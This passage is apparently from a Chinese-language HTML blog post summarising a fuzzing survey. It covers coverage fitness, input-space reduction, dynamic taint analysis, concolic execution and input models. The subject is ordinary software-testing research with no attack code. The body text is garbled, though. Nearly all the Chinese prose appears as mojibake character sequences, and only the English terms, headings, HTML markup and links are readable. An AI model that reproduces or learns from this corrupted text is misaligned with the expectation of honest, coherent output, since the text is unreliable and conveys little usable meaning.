å·²ç»è¢«è®­ç»ƒï¼Œåˆ™æ–°çš„è¾¹ <code>ACDEG</code> å°†ä¸ä¼šè¢«ä½œä¸ºæ–°çš„ç§å­ä¿ç•™ï¼Œå› ä¸ºåœ¨æ€»ä½“ä½å›¾ä¸­æ—©å·²å­˜åœ¨æ‰€æœ‰çš„è¾¹</p></blockquote><p>ä¸€ä¸ªè§£å†³æ–¹æ¡ˆæ˜¯ç ”ç©¶ç‹¬ç«‹ä½å›¾çš„èåˆï¼Œä½†ç”±äºèåˆä½å›¾ä¼šå¸¦æ¥å¤ªå¤šçš„ç§å­ï¼Œè¿™éœ€è¦åœ¨ fuzzing æ•ˆç‡ä¸æ•æ„Ÿè¦†ç›–ç‡é—´å¹³è¡¡ï¼Œä¸€ä¸ªæ½œåœ¨çš„è§£å†³æ–¹æ¡ˆæ˜¯ä½¿ç”¨<strong>åŠ¨æ€ä¸»æˆåˆ†åˆ†æ</strong>ï¼ˆdynamic principle component analysisï¼‰æ¥å‡å°‘æ•°æ®é›†çš„ç»´åº¦ï¼Œå…¶ä»–çš„è§£å†³æ–¹æ¡ˆåˆ™æ˜¯ä¸ºè¾¹è¦†ç›–ç‡æä¾›é¢å¤–ä¿¡æ¯ï¼ŒåŒ…æ‹¬ï¼šè¾¹å“ˆå¸Œï¼ˆedge hashï¼‰ã€è°ƒç”¨ä¸Šä¸‹æ–‡ï¼ˆcalling contextï¼‰ã€å¤šçº§è¦†ç›–ç‡ï¼ˆmultilevel coverageï¼‰ã€ä»£ç å¤æ‚åº¦ï¼ˆcode complexityï¼‰</p><p>å¯¹ä½å›¾çš„æ”¹è¿›å…³æ³¨äºæœå¯»æ›´å¤šçš„ä»£ç è¦†ç›–ï¼Œç„¶è€Œè¿™æ ·çš„æ”¹è¿›å¯èƒ½æ²¡æ³•æ¢ç´¢å¤æ‚çš„æ‰§è¡ŒçŠ¶æ€ï¼Œå› æ­¤ä¸€ä¸ªæœ‰æ•ˆçš„è§£å†³æ–¹æ¡ˆä¾¿æ˜¯é€šè¿‡<strong>äººä¸ºç›‘ç£</strong>ï¼ˆhuman-in-the-loopï¼‰æ¥æŒ‡å¯¼å¯¹å¤æ‚æ‰§è¡ŒçŠ¶æ€çš„æ¢ç´¢</p><blockquote><p>ä¾‹å¦‚ Fig3.b ä¸ºä¸€æ®µè¿·å®«ä»£ç ï¼Œ<code>(a,b)</code> ä»£è¡¨åœ¨è¿·å®«ä¸­çš„ä½ç½®ï¼Œä¸ºäº†è§¦å‘ <code>bug()</code>ï¼Œ<code>(a,b)</code> åº”å½“æœ‰ç€ç‰¹å®šçš„å€¼ï¼Œç„¶è€Œ <code>switch</code> ä»…æœ‰å››æ¡è¾¹ï¼Œå¯ä»¥è¢«å¿«é€Ÿéå†ï¼Œåœ¨è¿™ä¹‹å fuzzing ä¾¿å¤±å»äº†å¯¹åˆ°è¾¾æ¼æ´ä½ç½®çš„æŒ‡å¼•ï¼›æ­¤æ—¶åˆ†æè€…å¯ä»¥è®©æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹æ¢ç´¢ <code>(a,b)</code> çš„ä¸åŒå€¼</p></blockquote><p>æ­¤å¤–ï¼Œæ¯”è¾ƒæ¡ä»¶çš„å€¼æ¯”äºŒè¿›åˆ¶ç»“æœæ›´åŠ æ•æ„Ÿï¼Œå³ <code>examined</code> æˆ– <code>not examined</code></p><blockquote><p>ä¾‹å¦‚ Fig3.a ä¸­è‹¥ <code>(x[3] - 0x44)</code> çš„å€¼æ˜¯å¯çŸ¥çš„ï¼Œåˆ™ fuzzer ä¾¿èƒ½é€‰æ‹©æ›´èƒ½æ»¡è¶³æ¡ä»¶ <code>if (x[3] == 0x44)</code> çš„ç§å­</p></blockquote><h3 id="3-5-2-Diverse-Fitness">3.5.2 Diverse Fitness</h3><p>ç”±äºæ¨¡ç³Šæµ‹è¯•å¯ç”¨æ¥æ£€æµ‹å¤šç§åº”æœ‰çš„ç¼ºé™·ï¼Œè€Œä»£ç è¦†ç›–å¯¹äºæ¨¡ç³Šæµ‹è¯•è€Œè¨€å¹¶éä¸€ç›´éƒ½æ˜¯æœ€å¥½çš„åé¦ˆï¼Œå› æ­¤å¤šç§ç±»å‹çš„ fitness è¢«é’ˆå¯¹ç‰¹å®šçš„åº”ç”¨ç¨‹åºæˆ–ç¼ºé™·è®¾è®¡äº†å‡ºæ¥ï¼š</p><ul><li><p><em>Legality of execution result</em> ï¼šä¸€é—¨ OOP è¯­è¨€ï¼ˆæ¯”å¦‚ Javaï¼‰ç”±ä¸€ä¸ªæ–¹æ³•è°ƒç”¨åºåˆ—ç»„æˆï¼Œéæ³•çš„æ‰§è¡Œç»“æœä¼šæŠ›å‡ºå¼‚å¸¸ï¼›åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­ä¼šç”Ÿæˆå¹¶ç»´æŠ¤èƒ½æ¢ç´¢æ›´å¤šæ–°çš„åŠåˆæ³•çš„ç›®æ ‡çŠ¶æ€çš„æ–°çš„è°ƒç”¨åºåˆ—</p></li><li><p><em>State Machine of protocol implementations</em> ï¼šç”±äºåè®®çš„å¤æ‚æ€§ï¼Œfuzzer é€šå¸¸é€šè¿‡æ­ç§¯æœ¨çš„æ–¹å¼æ¥æ¨æ–­å‡ºçŠ¶æ€æœºï¼šä»¥ä¸€ç»„ç§å­èµ·å§‹å˜å¼‚ä»¥è·å–æ–°çš„çŠ¶æ€ï¼ŒåŸºäºçŠ¶æ€æœºåˆ†ææ¼æ´ç‚¹å¹¶æœå¯»å¯èƒ½å­˜åœ¨æ¼æ´çš„çŠ¶æ€è½¬ç§»</p></li><li><p><em>Safety policy of robotic vehicles</em> ï¼šæœºå™¨è£…ç½®çš„ç‰©ç†/åŠŸèƒ½å®‰å…¨éœ€è¦  <em>å®‰å…¨ç­–ç•¥</em> ï¼ˆsafety policyï¼Œä¾‹å¦‚æœºå™¨çš„æ¸©åº¦é™åˆ¶ï¼‰ï¼Œå› æ­¤å¯ä»¥ä¿ç•™æ¥è¿‘è¿åå®‰å…¨ç­–ç•¥çš„è¾“å…¥ä½œä¸ºç§å­è¿›è¡Œå˜å¼‚</p></li><li><p><em>Fitness for deep learning system</em> ï¼šå¯¹æ·±åº¦å­¦ä¹ ç³»ç»Ÿï¼ˆDeep Learning Systemsï¼ŒDLSsï¼‰çš„æ¨¡ç³Šæµ‹è¯•è®¾è®¡äº†å‡ ç§ä¸åŒçš„ fitness</p></li></ul><blockquote><p>ä¾‹å¦‚ç¥ç»å…ƒè¦†ç›–ç‡ä»¥å‘ç°æç«¯åœºæ™¯ï¼ˆcorner casesï¼‰ï¼ŒæŸå¤±å‡½æ•°ä»¥å¢å¼ºè®­ç»ƒæ•°æ®ï¼Œæ“ä½œç¬¦å±‚ï¼ˆoperator-levelï¼‰è¦†ç›–ç‡ä»¥æ¢ç´¢æ·±åº¦å­¦ä¹ æ¨ç†æœºï¼ˆinference enginesï¼‰</p></blockquote><ul><li><p><em>Validation log for Android SmartTVs</em> ï¼š validation log å¯ä»¥è¢«ç”¨æ¥æ¨æ–­åˆæ³•çš„è¾“å…¥ä»¥åŠè·å–è¾“å…¥è¾¹ç•Œï¼Œè¿™ä¸º fuzzer æä¾›äº†é«˜æ•ˆçš„ç§å­ä¸”ç¼©å°äº†è¾“å…¥ç©ºé—´</p></li><li><p><em>Behavioral asymmetry of testing</em> ï¼šåœ¨å·®å¼‚æµ‹è¯•ä¸‹ï¼ˆdifferential testingï¼‰ï¼Œå¯ä»¥é€šè¿‡åœ¨ç›¸åŒåŠŸèƒ½å®ç°çš„ç›¸åŒè¾“å…¥ä¸Šè§‚æµ‹åˆ°ä¸åŒè¡Œä¸ºæ¥å‘ç°æ¼æ´</p></li><li><p><em>Alias coverage for data race</em> ï¼š alias coverage é€šè¿‡è·Ÿè¸ªä¸€å¯¹å¯èƒ½äº¤äº’çš„å†…å­˜è®¿é—®ï¼Œä»¥æ­¤å‘ç°ç”±äºç¼ºä¹åˆé€‚çš„åŒæ­¥æœºåˆ¶å¯¼è‡´çš„æ¡ä»¶ç«äº‰æ¼æ´</p></li></ul><blockquote><p>æ–‡ä¸­æåˆ°çš„æ˜¯å†…æ ¸æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ¡ä»¶ç«äº‰ï¼Œç”±äºä¸¤ä¸ªçº¿ç¨‹è®¿é—®ä¸€å—å…±äº«å†…å­˜æ—¶ç¼ºä¹åˆé€‚çš„åŒæ­¥æœºåˆ¶å¯¼è‡´ï¼Œä½†ç¬”è€…è§‰å¾—æ¡ä»¶ç«äº‰åº”è¯¥ä¸å±€é™äºè¿™æ ·çš„æƒ…å†µï¼ˆ</p></blockquote><ul><li><em>Dangerous locations for bugs</em> ï¼šå±é™©åŒºåŸŸæ˜¯å®¹æ˜“è§¦å‘æ¼æ´çš„åŒºåŸŸï¼Œfuzzer å¯ä»¥ç›´æ¥å°†èµ„æºé›†ä¸­åœ¨ä¸Šè¾¹è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ä»¥æé«˜æ•ˆç‡</li></ul><blockquote><p>ä¾‹å¦‚å¯¹å¹¶å‘æ¼æ´è€Œè¨€å¯ä»¥æ˜¯ä¼šé€ æˆå¯¹åŸå­æ€§çš„è¿åã€æ¡ä»¶ç«äº‰ç­‰çš„ä»£ç åŒºåŸŸï¼Œå¯¹äºéå¹¶å‘æ¼æ´è€Œè¨€å¯ä»¥é€šè¿‡è¡¥ä¸æµ‹è¯•ã€å´©æºƒå¤ç°ã€é™æ€åˆ†ææŠ¥å‘Šã€ä¿¡æ¯æµæ£€æµ‹æ¥è·å¾—ï¼Œæ­¤å¤–å±é™©åŒºåŸŸä¹Ÿå¯ä»¥æ˜¯å†…å­˜è®¿é—®ã€sanitizer æ£€æŸ¥æˆ–æ˜¯ commit è®°å½•</p></blockquote><h2 id="3-6-Evaluation-Theory">3.6 Evaluation Theory</h2><p>ä¸€ä¸ªåˆé€‚çš„<strong>è¯„ä¼°</strong>ï¼ˆevaluationï¼‰å¯ä»¥åœ¨æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ä¸­å¸®åŠ©å…¶æé«˜è¡¨ç°ï¼ŒåŒ…æ‹¬æœ‰æ•ˆå®éªŒè¯­æ–™åº“ã€å…¬å¹³çš„è¯„ä¼°ç¯å¢ƒã€åˆç†çš„æ¨¡ç³Šæµ‹è¯•æ—¶é—´ã€å…¨é¢çš„å¯¹æ¯”æŒ‡æ ‡</p><blockquote><p><strong>Gap 1</strong>ï¼šæ¨¡ç³Šæµ‹è¯•ç†è®ºç¼©å°äº†è¾“å…¥ç©ºé—´ä¸ç¼ºé™·ç©ºé—´çš„å·®è·ï¼ŒåŸºäºç¨‹åºè¡¨ç°ï¼ˆå¦‚æ¼æ´åˆ°è¾¾ã€çŠ¶æ€è½¬ç§»ã€çŠ¶æ€å‘ç°ï¼‰è§„åˆ’æ¨¡ç³Šæµ‹è¯•è¿‡ç¨‹ï¼Œå¤§éƒ¨åˆ†çš„ç†è®ºè§„åˆ’äº†ç§å­è°ƒåº¦ï¼Œå‡ ä¹æ‰€æœ‰çš„ fuzzer åŸºäºé—ä¼ ç®—æ³•è§„åˆ’ç§å­å­˜ç•™</p></blockquote><h1>0x04. SEARCH SPACE OF INPUTS</h1><p>ä¸ºäº†ç¼©å°è¾“å…¥ç©ºé—´ã€æå‡æ¨¡ç³Šæµ‹è¯•çš„æ€§èƒ½ï¼Œfuzzers å°†ä¸€ä¸ªè¾“å…¥ä¸­çš„<strong>å…³è”å­—èŠ‚</strong>ï¼ˆrelated bytesï¼Œä¾‹å¦‚ç»„æˆåŒä¸€æ•°æ®ç»“æ„ã€å½±å“åŒä¸€è·¯å¾„çº¦æŸã€ç¬¦åˆåŒä¸€æ–‡æ³•ï¼‰åˆ†ç»„å¹¶ä¸ºæ¯ä¸€ç»„ä½¿ç”¨ç‰¹å®šçš„å˜å¼‚å™¨ï¼ˆåŒ…æ‹¬å­—èŠ‚å˜å¼‚ä¸å—å˜å¼‚ï¼‰</p><blockquote><p>å‡è®¾è¾“å…¥ç©ºé—´ä¸­æœ‰ <code>a* b</code> å­—èŠ‚ï¼Œå°†å…¶ç­‰åˆ†ä¸º a å—ï¼Œåˆ™ç›¸è¾ƒäº <em>256<sup>a*b</sup></em> è€Œè¨€ï¼Œå¯¹äºç‰¹å®šè·¯å¾„çº¦æŸçš„æœç´¢ç©ºé—´ä»…ä¸º <em>a * 256<sup>b</sup></em></p></blockquote><p>åœ¨è·¯å¾„çº¦æŸæ±‚è§£ä¸­ï¼Œå¯¹å…³è”å­—èŠ‚çš„å…³æ³¨åŒæ ·èƒ½ç¼©å°æœç´¢ç©ºé—´ï¼Œä¾‹å¦‚ Fig4.a åœ¨ç¬¬ 13 è¡Œçš„çº¦æŸæ»¡è¶³çš„æƒ…å†µä¸‹ç¬¬14è¡Œä»…ä¸ä¸€ä¸ªå­—èŠ‚ç›¸å…³è”</p><p>ä¸€ç§ç‰¹æ®Šçš„è¾“å…¥æ˜¯ä¸ºå¦‚åè®®ã€ç¼–è¯‘å™¨ç­‰è¿›è¡Œé«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥ï¼Œå¦‚ Fig4.b ä¸­ä»£ç éœ€è¦ä¸€ä¸ªç‰¹æ®Šèµ·å§‹æ ¼å¼çš„è¾“å…¥</p><p><img src="https://s2.loli.net/2022/10/27/PNphaetFqYm8jVJ.png" alt="Fig. 4. Search space of input. "></p><p>Table 2 ä¸­çš„ fuzzers çš„ä¸»è¦è´¡çŒ®æ˜¯ç¼©å°è¾“å…¥ç©ºé—´ï¼š</p><p><img src="https://s2.loli.net/2022/10/27/JweSDsxm8UZCTLk.png" alt="Table 2. Input space. Fuzzers reduce the input space by grouping the related bytes. The groups of bytes are obtained based on certain relation."></p><h2 id="4-1-Byte-constraint-Relation">4.1 Byte-constraint Relation</h2><p>å¤§éƒ¨åˆ†çš„è·¯å¾„çº¦æŸä»…è¢«ä¸€å°éƒ¨åˆ†è¾“å…¥æ‰€å½±å“ï¼Œå› æ­¤è‹¥ fuzzer ä»…å˜å¼‚å…³è”å­—èŠ‚ï¼Œåˆ™èƒ½é€šè¿‡ç¼©å°è¾“å…¥çš„æœç´¢ç©ºé—´ä»è€Œæ˜¾è‘—åœ°æå‡æ€§èƒ½</p><blockquote><p>ä¾‹å¦‚æˆ‘ä»¬éœ€è¦å˜å¼‚ä¸€ä¸ªå­—èŠ‚æ•°ç»„ a[10] éœ€è¦ç”Ÿæˆ <em>256<sup>11</sup></em> ä¸ªè¾“å…¥ï¼Œä½†è‹¥æ˜¯æˆ‘ä»¬çŸ¥é“ä»…æœ‰ a[2] çš„å€¼æ˜¯æœ‰ç”¨çš„ï¼Œåˆ™æˆ‘ä»¬ä»…éœ€è¦ç”Ÿæˆ 256 ä¸ªè¾“å…¥</p></blockquote><p>åœ¨è·å¾—å­—èŠ‚çº¦æŸå…³ç³»åï¼Œå¯ä»¥éšæœºåœ°æˆ–ä»0~255 è¿›è¡Œå˜å¼‚ï¼Œä½†éƒ½æ¯”è¾ƒä½æ•ˆï¼›è‹¥åœ¨å­—èŠ‚å…³ç³»çš„æ¨æ–­è¿‡ç¨‹ä¸­å¯ä»¥è·å¾—æ¯”è¾ƒæŒ‡ä»¤çš„å€¼ï¼Œfuzzer å¯ä»¥åœ¨å˜å¼‚æ—¶é€‰æ‹©é€šè¿‡è·¯å¾„çº¦æŸçš„å€¼</p><p>æ­¤å¤–ï¼Œæ¨¡ç³Šæµ‹è¯•å¯ä»¥ä½¿ç”¨ <em>å¡åº¦ä¸‹é™ç®—æ³•</em> ï¼ˆgradient descent algorithmï¼‰æ¥å˜å¼‚å…³è”å­—èŠ‚å¹¶é€æ¸è§£å†³è·¯å¾„çº¦æŸ</p><h3 id="4-1-1-Dynamic-Taint-Analysis">4.1.1 Dynamic Taint Analysis</h3><p><strong>åŠ¨æ€æ±¡ç‚¹åˆ†æ</strong>ï¼ˆDynamic Taint Analysisï¼ŒDTAï¼‰æ˜¯åœ¨æ„å»ºè¾“å…¥ä¸è·¯å¾„çº¦æŸçš„å…³ç³»ä¸­å¸¸ç”¨çš„ä¸€é¡¹æŠ€æœ¯ï¼Œå…¶é€šè¿‡<strong>åœ¨è¾“å…¥ä¸­è¿›è¡Œæ ‡è®°ååœ¨è¿è¡Œä¸­ä¼ æ’­æ ‡ç­¾ï¼ˆlabelï¼‰å¹¶æ£€æŸ¥è·å–åˆ°æ ‡ç­¾çš„å˜é‡</strong>çš„æ–¹å¼æ¥æ„å»ºå˜é‡ä¸æ•°æ®çš„å…³è”</p><p>fuzzer å¯ä»¥ä½¿ç”¨ DTA æ¥æ„å»ºè¾“å…¥ä¸å®‰å…¨æ•æ„Ÿç‚¹ï¼ˆsecurity-sensitive pointsï¼Œä¾‹å¦‚æ¡ä»¶è·³è½¬æˆ–ç³»ç»Ÿè°ƒç”¨ï¼‰é—´çš„å…³ç³»</p><h3 id="4-1-2-Relation-Inference">4.1.2 Relation Inference</h3><p>DTA éœ€è¦å¤§é‡çš„äººå·¥ä¸”å¯èƒ½è·å¾—ä¸å‡†ç¡®çš„å…³ç³»ï¼ˆdue to implicit data flowï¼‰ã€‚ç”±äº fuzzing è¿‡ç¨‹ä¸­éœ€è¦å¤§é‡æ‰§è¡Œæµ‹è¯•ç”¨ä¾‹ï¼Œä¸€ç§è½»é‡çš„è§£å†³æ–¹æ¡ˆæ˜¯åœ¨è¿è¡Œæ—¶æ¨æ–­å­—èŠ‚å…³è”ï¼Œæœ‰ä¸¤ç§å…·ä½“æ–¹æ¡ˆï¼š</p><ul><li>è§‚æµ‹æ˜¯å¦å¯¹ä¸€ä¸ªå­—èŠ‚çš„å˜å¼‚æ”¹å˜äº†å˜é‡çš„å€¼ï¼Œè¿™æ„å‘³ç€è¯¥å­—èŠ‚å¯èƒ½ä¸å˜é‡ã€æ¯”è¾ƒæŒ‡ä»¤æˆ–åˆ†æ”¯ç›¸å…³è”</li><li>åŸºäºæ·±åº¦å­¦ä¹ æ„å»ºè¾“å…¥å­—èŠ‚ä¸åˆ†æ”¯è¡Œä¸ºé—´å¤§æ¦‚çš„å…³ç³»</li></ul><h2 id="4-2-Concolic-Execution">4.2 Concolic Execution</h2><p><strong>æ··åˆæ‰§è¡Œ</strong>ï¼ˆConcolic Executionï¼Œaka dynamic symbolic executionï¼‰å°†ç¨‹åºå˜é‡è§†ä½œ<strong>ç¬¦å·å˜é‡</strong>ï¼ˆsymbolic variablesï¼‰ï¼Œè·Ÿè¸ªè·¯å¾„çº¦æŸå¹¶ä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ¥ä¸ºç‰¹å®šè·¯å¾„ç”Ÿæˆå…·ä½“è¾“å…¥ï¼šé€šè¿‡æ±‚è§£è·¯å¾„çº¦æŸæ¥ç¼©å°è¾“å…¥ç©ºé—´</p><blockquote><p>å…³äºä»€ä¹ˆæ˜¯ concolic executionï¼Œå¯ä»¥çœ‹è¿™å¼ å›¾ï¼ˆ<s>å¦‚æœä½ ä¸çŸ¥é“ç¬¦å·æ‰§è¡Œé‚£ğŸ‘´å»ºè®®å…ˆåˆ«çœ‹äº†</s>ï¼‰ï¼š</p><p><img src="https://s2.loli.net/2022/10/27/Fvl3yRNMnzKamfk.jpg" alt="concolic execution"></p></blockquote><p>åŒæ—¶ä½¿ç”¨ç¬¦å·æ‰§è¡Œä¸æ¨¡ç³Šæµ‹è¯•çš„æŠ€æœ¯ç§°ä¹‹ä¸º<strong>æ··åˆæ¨¡ç³Šæµ‹è¯•</strong>ï¼ˆhybrid fuzzingï¼‰æˆ–<strong>ç™½ç›’æ¨¡ç³Šæµ‹è¯•</strong>ï¼ˆwhitebox fuzzingï¼‰ï¼šä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ¥æ‰§è¡Œç›®æ ‡ç¨‹åºä¸­çš„æ‰§è¡Œè·¯å¾„ï¼‹ä½¿ç”¨ç¬¦å·æ‰§è¡Œæ¥æ±‚è§£æ‰§è¡Œè·¯å¾„ä¸­çš„çº¦æŸ</p><p>ç”±äºä¸ºæ¯æ¡æ‰§è¡Œè·¯å¾„éƒ½ä½¿ç”¨ç¬¦å·æ‰§è¡Œä¼šéå¸¸è€—æ—¶ï¼Œå› æ­¤å½“ fuzzing æ— æ³•è·å¾—æ›´å¤šçŠ¶æ€æ—¶ï¼Œæ··åˆæ‰§è¡Œè¢«ç”¨ä»¥è§£å†³ fuzzing æ— æ³•æ»¡è¶³çš„è·¯å¾„çº¦æŸ</p><p>æ··åˆæ¨¡ç³Šæµ‹è¯•çš„ä¸€ä¸ªæ”¹è¿›ä¾¿æ˜¯ä¸ºæ··åˆæ‰§è¡Œæ’åºå‡ºæœ€éš¾çš„è·¯å¾„ä¾›å…¶è§£å†³ï¼Œä¹Ÿå¯ä»¥é€šè¿‡å¼€å‘ä¸€ä¸ªå¤§æ¦‚çš„çº¦æŸæ±‚è§£å™¨æ¥æå‡ï¼Œé€šå¸¸<strong>å¯æ»¡è¶³æ€§æ¨¡ç†è®º</strong>ï¼ˆsatisfiability modulo theoryï¼ŒSTMï¼‰æ±‚è§£å™¨ï¼ˆä¾‹å¦‚ z3 æˆ– MathSAT5ï¼‰è¢«ç”¨æ¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä½†å­˜åœ¨å¤æ‚çº¦æŸåŠè·¯å¾„çˆ†ç‚¸çš„é—®é¢˜ï¼Œä¸ºäº†ç¼“è§£è¿™ä¸ªé—®é¢˜ï¼Œçº¦æŸæ±‚è§£å™¨ä»…ç¬¦å·åŒ–è¢«è¾“å…¥å½±å“çš„è·¯å¾„</p><p>å¦ä¸€ä¸ªæ”¹è¿›ä¾¿æ˜¯è®©çº¦æŸæ±‚è§£å™¨ä½¿ç”¨ç°ç›’æ¨¡å¼ï¼Œä¾‹å¦‚ï¼Œå…¶ä½¿ç”¨çº¿æ€§å‡½æ•°ä»¥æ¥è¿‘çº¦æŸè¡Œä¸ºï¼Œå› ä¸ºå¤§éƒ¨åˆ†çš„è·¯å¾„çº¦æŸè¢«å‘ç°éƒ½æ˜¯è¶‹å‘äºæ˜¯çº¿æ€§çš„æˆ–å•è°ƒçš„</p><p>ç ”ç©¶äººå‘˜ä¹Ÿå¼€å§‹ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•æ¥æ±‚è§£è·¯å¾„çº¦æŸï¼Œä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/3338906.3338921">JFS</a> å°† SMT å…¬å¼ç¿»è¯‘ä¸ºç¨‹åºå¹¶ä½¿ç”¨è¦†ç›–ç‡æŒ‡å¯¼çš„æ¨¡ç³Šæµ‹è¯•æ¥æ¢ç´¢ç¨‹åºï¼Œæ¨¡ç³Šæµ‹è¯•ç”Ÿæˆçš„è¾“å…¥åˆ°è¾¾ç‰¹å®šåŒºåŸŸæˆ–ç›¸åº”çš„ç¨‹åºæ—¶æ„å‘³ç€è§£å‡ºäº† SMT å…¬å¼</p><p>çº¦æŸæ±‚è§£å™¨ä¹Ÿå¯ä»¥åŸºäºç›®æ ‡çš„ç‰¹æ€§è¿›è¡Œæ”¹è¿›ï¼Œ<a href="https://ieeexplore.ieee.org/document/9152662">Pangolin</a> ä½¿ç”¨å¤šé¢è·¯å¾„æŠ½è±¡ï¼ˆpolyhedral path abstractionï¼‰æ¥è§£å†³åµŒå¥—è·¯å¾„çº¦æŸï¼ˆnested path constraintsï¼‰ï¼Œè¿™ç§æ–¹æ³•ä¼šä¿ç•™å†å²çº¦æŸçš„è§£ç­”ç©ºé—´ï¼ˆsolution spaceï¼‰å¹¶é‡ç”¨è§£ç­”ç©ºé—´ä»¥æ»¡è¶³å½“å‰è·¯å¾„çº¦æŸçš„å¯è¾¾æ€§</p><blockquote><p>ä¾‹å¦‚å¯¹äº Fig4.a ä¸­çš„ç¬¬14è¡Œçš„çº¦æŸï¼Œè¾“å…¥é¦–å…ˆè¦æ»¡è¶³ç¬¬13è¡Œçš„çº¦æŸ</p></blockquote><p>ä¸ºäº†åœ¨éœ€è¦é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥çš„ç¨‹åºä¸­ä½¿ç”¨æ··åˆæ¨¡ç³Šæµ‹è¯•ï¼Œ<a href="https://dl.acm.org/doi/10.1145/1375581.1375607">Godefroid</a> å°†æ–‡æ³•ä¸­çš„è¯ç´ ï¼ˆtokenï¼‰ç¬¦å·åŒ–ä¸ºç¬¦å·å˜é‡ï¼Œå¹¶ä½¿ç”¨ä¸Šä¸‹æ–‡æ— å…³çš„çº¦æŸæ±‚è§£å™¨ï¼ˆcontext-free constraint solverï¼‰æ¥ç”Ÿæˆæ–°çš„è¾“å…¥</p><h2 id="4-3-Program-Transformation">4.3 Program Transformation</h2><p>å¯¹æ¨¡ç³Šæµ‹è¯•è€Œè¨€ï¼Œ<strong>ç¨‹åºè½¬æ¢</strong>ï¼ˆprogram transformationï¼‰çš„ç›®çš„æ˜¯ç§»é™¤é˜²æ­¢æ¨¡ç³Šæµ‹è¯•å‘ç°æ›´å¤šæ‰§è¡ŒçŠ¶æ€çš„å®Œæ•´æ€§æ£€æŸ¥ï¼Œé€šè¿‡ç§»é™¤è¿™äº›æ£€æŸ¥ï¼Œæ¨¡ç³Šæµ‹è¯•å¯ä»¥æ¢ç´¢åˆ°ç›®æ ‡ç¨‹åºæ›´æ·±å¤„çš„ä»£ç å¹¶æš´éœ²å‡ºæ½œåœ¨çš„æ¼æ´ï¼Œä½†è¿™ä¹Ÿä¼šå¼•å…¥ä¸€äº›è¯¯æŠ¥ï¼ˆfalse positivesï¼‰ï¼Œå¯ä»¥é€šè¿‡ç¬¦å·æ‰§è¡Œè¿›è¡ŒéªŒè¯</p><p>å› æ­¤ program transformation é€šè¿‡èšç„¦äºå¯èƒ½è§¦å‘æ¼æ´çš„è¾“å…¥æ¥ç¼©å°æœç´¢ç©ºé—´</p><h2 id="4-4-Input-Model">4.4 Input Model</h2><p>è®¸å¤šåº”ç”¨ç¨‹åºéƒ½éœ€è¦é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥ï¼Œä¾‹å¦‚åè®®å®ç°ã€ç³»ç»Ÿè°ƒç”¨ç­‰ï¼Œ<strong>è¾“å…¥æ¨¡å‹</strong>ï¼ˆinput modelï¼‰æŒ‡å®šäº†æ„é€ é«˜åº¦ç»“æ„åŒ–è¾“å…¥çš„è§„åˆ™ï¼ŒåŒ…æ‹¬ç»“æ„ä½“ã€æ ¼å¼ã€è¾“å…¥çš„æ•°æ®çº¦æŸï¼Œå³è¿åè¯­æ³•æˆ–è¯­ä¹‰çš„è¾“å…¥ä¼šåœ¨ä¸€å¼€å§‹å°±è¢«æ‹’ç»ï¼Œç”±æ­¤<strong>è¾“å…¥ç©ºé—´ä¾¿è¢«é™åˆ¶äºè¾“å…¥æ¨¡å‹</strong></p><h3 id="4-4-1-Accessible-Models-or-Tools">4.4.1 Accessible Models or Tools</h3><p>åŸºäºç©ºç™½è§„èŒƒï¼ˆbare specificationsï¼‰çš„è¾“å…¥ç”Ÿæˆéœ€è¦ç¹é‡çš„å·¥ç¨‹å·¥ä½œï¼Œå¤æ‚è§„èŒƒçš„è§£æä¹Ÿéå¸¸å®¹æ˜“å‡ºé”™ï¼Œå› æ­¤ç ”ç©¶ç¤¾åŒºä¸ºä¸€äº›é«˜åº¦ç»“æ„åŒ–çš„è¾“å…¥å¼€æºäº†ä¸€äº›å·¥å…·</p><blockquote><p>ä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/357766.351266">QuickCheck</a> å’Œ <a href="https://www.antlr.org/">ANTLR</a>ï¼Œä¾‹å¦‚ <a href="https://www.ndss-symposium.org/ndss-paper/nautilus-fishing-for-deep-bugs-with-grammars/">NAUTILUS</a> ä¸ <a href="https://www.researchgate.net/publication/335427315_Superion_Grammar-Aware_Greybox_Fuzzing">Superion</a> ä¾¿åŸºäº ANTLR ç”Ÿæˆè¾“å…¥</p></blockquote><p>åœ¨ä¸€äº›åœºæ™¯ä¸‹è¾“å…¥æ¨¡å‹ä¹Ÿå¯ä»¥æ˜¯è¾“å…¥çš„ç±»å‹ï¼ˆä¾‹å¦‚ API å‚æ•°æˆ–ç‰©ç†ä¿¡å·ï¼‰</p><h3 id="4-4-2-Integration-of-Implementations">4.4.2 Integration of Implementations</h3><p>å¦ä¸€ä¸ªå‰æ™¯è¾ƒå¥½çš„æ–¹æ¡ˆæ˜¯å°†æ¨¡ç³Šæµ‹è¯•ä¸ç›®æ ‡åº”ç”¨è¿›è¡Œé›†æˆï¼Œè¿™æ ·çš„é›†æˆå…è®¸æ¨¡ç³Šæµ‹è¯•é€šè¿‡å®¢åˆ¶åŒ–è¾“å…¥ç”Ÿæˆè¿‡ç¨‹æ¥æµ‹è¯•é¢„æœŸæ€§èƒ½</p><blockquote><p>ä¾‹å¦‚ <a href="https://dl.acm.org/doi/10.1145/2976749.2978411">TLS-Attacker</a> åˆ›é€ äº†èƒ½åŸºäºæ¯ä¸ªæ®µçš„ç±»å‹å˜å¼‚è¾“å…¥çš„æ¡†æ¶ï¼Œå¹¶èƒ½æ”¹å˜åè®®æ¶ˆæ¯çš„é¡ºåº</p></blockquote><h3 id="4-4-3-Intermediate-Representation">4.4.3 Intermediate Representation</h3><p>å¦ä¸€ä¸ªå¤æ‚çš„æ–¹æ¡ˆæ˜¯å°†è¾“å…¥æ¨¡å‹è½¬åŒ–ä¸ºä¸€ç§<strong>ä¸­é—´è¡¨ç¤º</strong>ï¼ˆIntermediate 